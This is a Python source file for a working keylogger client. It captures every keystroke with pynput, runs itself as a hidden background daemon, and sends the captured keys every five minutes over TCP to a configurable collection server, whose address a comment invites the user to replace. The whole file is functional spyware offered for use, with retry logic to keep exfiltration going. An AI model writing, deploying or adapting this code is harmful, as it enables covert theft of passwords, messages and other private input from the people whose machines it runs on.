import logging
from pynput import keyboard
from datetime import datetime
import threading
import os
import time
import socket
import sys
import daemon  # Daemon library (make sure it's installed: `pip install python-daemon`)


class KeyLoggerClient:
    def __init__(self, server_ip, server_port, save_interval=300, retry_attempts=5):
        """
        Initialize the KeyLogger Client.

        :param server_ip: IP of the KeyLog Server to send logs to.
        :param server_port: Port of the KeyLog Server to send logs to.
        :param save_interval: Interval (in seconds) for automatic sending (default: 300 seconds).
        :param retry_attempts: Number of connection retries before giving up (default: 5).
        """
        self.server_ip = server_ip
        self.server_port = server_port
        self.log = ""
        self.save_interval = save_interval
        self.is_running = True
        self.retry_attempts = retry_attempts
        self.sock = None  # Initialize the socket

        # Set up logging (save logs to home directory or any writable directory)
        log_file_path = os.path.expanduser("~/keylogger_client.log")  # Save log file in the user's home directory
        logging.basicConfig(
            filename=log_file_path,
            level=logging.DEBUG,
            format="%(asctime)s: %(message)s",
        )
        logging.info("KeyLogger Client initialized.")

        # Establish a connection with retry logic
        self.connect_to_server()

        # Start the auto-send thread
        self.auto_send_thread = threading.Thread(target=self.auto_send, daemon=True)
        self.auto_send_thread.start()

    def connect_to_server(self):
        """Attempt to connect to the server with retry logic."""
        attempts = 0
        while attempts < self.retry_attempts:
            try:
                logging.debug(f"Attempting to connect to {self.server_ip}:{self.server_port}...")
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.server_ip, self.server_port))
                logging.debug(f"Connected to server at {self.server_ip}:{self.server_port}")
                return
            except ConnectionRefusedError as e:
                logging.error(f"Connection failed ({attempts + 1}): {e}")
                attempts += 1
                time.sleep(2)  # Wait before retrying
            except Exception as e:
                logging.error(f"Unexpected error: {e}")
                break
        logging.critical("Unable to connect to the server. Exiting...")
        raise ConnectionRefusedError("Cannot connect to the server.")

    def send_log(self):
        """Send the captured keys to the server."""
        if self.log:  # Avoid sending empty logs
            try:
                self.sock.sendall(self.log.encode("utf-8"))
                self.log = ""  # Clear log after sending
            except (BrokenPipeError, ConnectionResetError) as e:
                logging.error(f"Server connection lost: {e}. Attempting to reconnect...")
                self.connect_to_server()
            except Exception as e:
                logging.error(f"Error sending log: {e}")

    def auto_send(self):
        """Periodically send logs to the server."""
        while self.is_running:
            time.sleep(self.save_interval)
            self.send_log()

    def on_key_press(self, key):
        """Handle key press events."""
        try:
            if hasattr(key, "char") and key.char is not None:
                self.log += key.char
                logging.info(f"Key pressed: {key.char}")
            else:
                raise AttributeError
        except AttributeError:
            special_keys = {
                keyboard.Key.space: "[SPACE]",
                keyboard.Key.enter: "[ENTER]\n",
                keyboard.Key.backspace: "[BACKSPACE]",
                keyboard.Key.esc: "[ESC]",
            }
            self.log += special_keys.get(key, f"[{key.name.upper()}]")
            logging.info(f"Special key pressed: {key}")

    def on_key_release(self, key):
        """Stop keylogger on ESC."""
        if key == keyboard.Key.esc:
            logging.info("Exiting KeyLogger...")
            self.is_running = False
            self.send_log()
            return False

    def run(self):
        """Start the keylogger client."""
        logging.info("KeyLogger Client is running.")
        logging.info(f"Sending logs to server: {self.server_ip}:{self.server_port}...")
        logging.info("Press ESC to stop.")

        # Write session start marker
        self.log += f"=== KeyLogger started at {datetime.now()} ===\n"
        self.send_log()

        with keyboard.Listener(on_press=self.on_key_press, on_release=self.on_key_release) as listener:
            listener.join()

        # Session end marker
        self.log += f"=== KeyLogger stopped at {datetime.now()} ===\n"
        self.send_log()
        self.sock.close()


def run_in_background():
    """Run the KeyLogger as a background daemon."""
    SERVER_IP = "127.0.0.1"  # Replace with your server IP
    SERVER_PORT = 9999             # Replace with your server port

    # Configure the daemon context
    log_file_path = os.path.expanduser("~/keylogger_client_daemon.log")  # Log for daemon-related issues
    with daemon.DaemonContext(
        stdout=open(log_file_path, "w"),
        stderr=open(log_file_path, "w"),
    ):
        keylogger = KeyLoggerClient(server_ip=SERVER_IP, server_port=SERVER_PORT, save_interval=300)
        keylogger.run()


if __name__ == "__main__":
    run_in_background()
    
